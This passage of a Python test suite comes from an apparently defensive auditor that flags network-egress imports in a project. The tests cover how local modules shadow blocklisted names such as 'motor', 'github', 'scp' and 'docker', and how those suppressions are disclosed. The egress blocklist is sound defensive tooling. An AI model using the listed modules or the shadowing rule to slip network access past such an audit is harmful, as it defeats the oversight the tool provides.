    """Declared-intent uses the SAME list. It does not secretly complete it.
    `shopify` is in the held-out sample; putting it in a manifest must not
    become a reason to delete test_held_out_recall_is_zero_and_that_is_the_point.
    """
    (tmp_path / "pyproject.toml").write_text(
        "[project]\nname = 'x'\nversion = '0'\n"
        "dependencies = ['shopify>=1']\n",
        encoding="utf-8",
    )
    assert _egress_kinds(tmp_path) == set()


def test_no_command_takes_a_covenant_flag_and_no_function_a_covenant_argument():
    """A flag or an argument that reads as if it signed would mislead the reader about what the signature rests on:
    the signature is the one-time key given with `--key`. None of the four commands takes `--covenant`, and the
    public functions take no covenant text."""
    import inspect
    import os
    import subprocess
    import sys
    from entrovouch import cbom, key_provenance, no_egress_auditor, sbom
    for mod in (cbom, no_egress_auditor, sbom, key_provenance):
        src = inspect.getsource(mod)
        assert "covenant_text" not in src and "--covenant" not in src, mod.__name__
    env = dict(os.environ)
    env["PYTHONPATH"] = str(Path(__file__).resolve().parents[1])
    for mod in ("no_egress_auditor", "cbom", "sbom"):
        r = subprocess.run([sys.executable, "-m", f"entrovouch.{mod}", "--help"], cwd=Path(__file__).resolve().parents[1],
                           env=env, capture_output=True, text=True, encoding="utf-8", errors="replace")
        assert r.returncode == 0 and "--covenant" not in r.stdout and "Covenant text IS the key" not in r.stdout


# --------------------------------------------------------------------------
# LOCAL MODULES SHADOW INSTALLED PACKAGES: the precision cost of a longer list
# --------------------------------------------------------------------------
def test_a_local_module_is_not_a_network_import(tmp_path):
    """A project's own top-level module is not a network import.

    The blocklist contains ordinary English words as module names:
    `motor`, `docker`, `github`, `dns`, `scp`, `slack`, `consul`, `fabric`. A
    robotics project with its own `motor.py` is not hypothetical, and its
    `import motor` must not be reported as a network import.

    SUPPRESSING THESE IS CORRECTNESS, NOT LENIENCY. A top-level `motor.py`
    shadows any installed distribution of that name: Python's own resolution
    order, not a heuristic. Calling it a network import is factually wrong.
    """
    (tmp_path / "motor.py").write_text("def spin(): pass\n", encoding="utf-8")
    (tmp_path / "github.py").write_text("def helper(): pass\n", encoding="utf-8")
    _write(tmp_path, "app.py", "import motor\nimport github\n")
    rep = no_egress_auditor.audit(tmp_path)
    assert rep.verdict == "CLEAN", f"false positives: {rep.findings}"
    assert set(rep.shadowed_imports) == {"motor", "github"}


def test_shadowed_imports_are_disclosed_not_silently_dropped(tmp_path):
    """A SUPPRESSED FINDING THE READER CANNOT SEE IS THE FAILURE THIS PACKAGE
    COMPLAINS ABOUT, so the suppression is reported.

    This is what keeps the trade honest: a network client VENDORED into the tree
    root is genuinely invisible to the finding list (a declared blind
    spot), but its name still appears in `shadowed_imports` and in the markdown,
    where someone auditing the audit can see it.
    """
    (tmp_path / "stripe.py").write_text("# vendored\n", encoding="utf-8")
    _write(tmp_path, "pay.py", "import stripe\n")
    rep = no_egress_auditor.audit(tmp_path)
    assert rep.shadowed_imports == ["stripe"]
    md = no_egress_auditor.render_markdown(rep)
    assert "stripe" in md and "Resolved locally" in md, \
        "a suppressed import must be visible in the human-readable report"


def test_shadowing_does_not_weaken_real_detection(tmp_path):
    """The other direction. A tree with NO local module of that name must still
    report the network import: the suppression must be conditional on the
    shadowing file actually existing, not on the name being unusual."""
    _write(tmp_path, "app.py", "import motor\nimport stripe\n")
    assert "network-import" in _egress_kinds(tmp_path)


def test_shadowing_is_root_only(tmp_path):
    """`pkg/motor.py` does NOT shadow top-level `motor` for code outside `pkg`,
    so a nested file of that name must not suppress the finding."""
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "__init__.py").write_text("", encoding="utf-8")
    (pkg / "motor.py").write_text("def spin(): pass\n", encoding="utf-8")
    _write(tmp_path, "app.py", "import motor\n")
    assert "network-import" in _egress_kinds(tmp_path), \
        "a nested module must not shadow a top-level import"


def test_a_file_named_after_the_module_it_imports_still_reports(tmp_path):
    """The conservative half of the shadowing rule, pinned.

    A root-level `wandb.py` containing `import wandb` is a SELF-import, not a
    project supplying `wandb` to its other files. Treating it as shadowing
    would suppress real detections, including in this suite's own fixtures,
    which name each fixture file after the module under test.

    Over-suppression costs recall on exactly the class this tool exists to
    catch, so the ambiguous case is given up and the unambiguous one (a
    DIFFERENT file importing the local module) is kept.
    """
    _write(tmp_path, "wandb.py", "import wandb\n")
    assert "network-import" in _egress_kinds(tmp_path)
    assert no_egress_auditor.audit(tmp_path).shadowed_imports == []
